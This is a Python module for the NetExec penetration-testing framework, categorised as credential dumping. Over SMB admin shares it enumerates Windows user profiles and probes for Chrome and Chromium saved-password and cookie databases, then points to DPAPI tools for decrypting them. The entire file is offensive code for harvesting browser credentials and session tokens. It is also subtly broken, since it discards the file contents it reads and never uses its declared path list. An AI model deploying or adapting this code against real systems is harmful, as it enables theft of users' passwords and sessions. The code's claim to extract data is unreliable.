from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Extract Chrome/Chromium browser cookies and saved login data
    Module by NetExec Community
    """

    name = "chrome_cookies"
    description = "Extract Chrome/Chromium browser cookies and login credentials"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        USER       Specify a username to target (default: all users)
        COOKIES    Extract cookies as well (default: False)
        """
        self.target_user = module_options.get("USER", None)
        self.gather_cookies = "COOKIES" in module_options

    def on_admin_login(self, context, connection):
        """Extract Chrome browser data from target system"""
        try:
            context.log.display("Searching for Chrome browser data...")
            
            # Common Chrome profile paths
            chrome_paths = [
                "C$\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                "C$\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
                "C$\\Users\\*\\AppData\\Local\\Chromium\\User Data\\Default\\Login Data",
                "C$\\Users\\*\\AppData\\Local\\Chromium\\User Data\\Default\\Cookies",
            ]
            
            found_files = []
            
            # Try to enumerate user directories
            try:
                users_list = connection.conn.listPath("C$", "Users\\*")
                usernames = [u.get_longname() for u in users_list if u.get_longname() not in [".", "..", "Public", "Default", "All Users"]]
                
                for username in usernames:
                    # Skip if targeting specific user
                    if self.target_user and username.lower() != self.target_user.lower():
                        continue
                    
                    # Check for Login Data (saved passwords)
                    login_data_path = f"Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
                    try:
                        connection.conn.getFile("C$", login_data_path, lambda x: None)
                        found_files.append(("Chrome Login Data", username, login_data_path))
                        context.log.success(f"Found Chrome Login Data for {username}")
                    except Exception:
                        pass
                    
                    # Check for Cookies if requested
                    if self.gather_cookies:
                        cookies_path = f"Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
                        try:
                            connection.conn.getFile("C$", cookies_path, lambda x: None)
                            found_files.append(("Chrome Cookies", username, cookies_path))
                            context.log.success(f"Found Chrome Cookies for {username}")
                        except Exception:
                            pass
                    
                    # Also check Chromium
                    chromium_login_path = f"Users\\{username}\\AppData\\Local\\Chromium\\User Data\\Default\\Login Data"
                    try:
                        connection.conn.getFile("C$", chromium_login_path, lambda x: None)
                        found_files.append(("Chromium Login Data", username, chromium_login_path))
                        context.log.success(f"Found Chromium Login Data for {username}")
                    except Exception:
                        pass
                
                if found_files:
                    context.log.highlight(f"Found {len(found_files)} Chrome/Chromium database(s)")
                    context.log.display("Note: Use --dpapi flag or dploot to decrypt the databases")
                else:
                    context.log.display("No Chrome/Chromium databases found")
                    
            except Exception as e:
                context.log.fail(f"Error enumerating users: {e}")
                
        except Exception as e:
            context.log.fail(f"Error extracting Chrome data: {e}")
            context.log.debug(f"Exception: {e}")
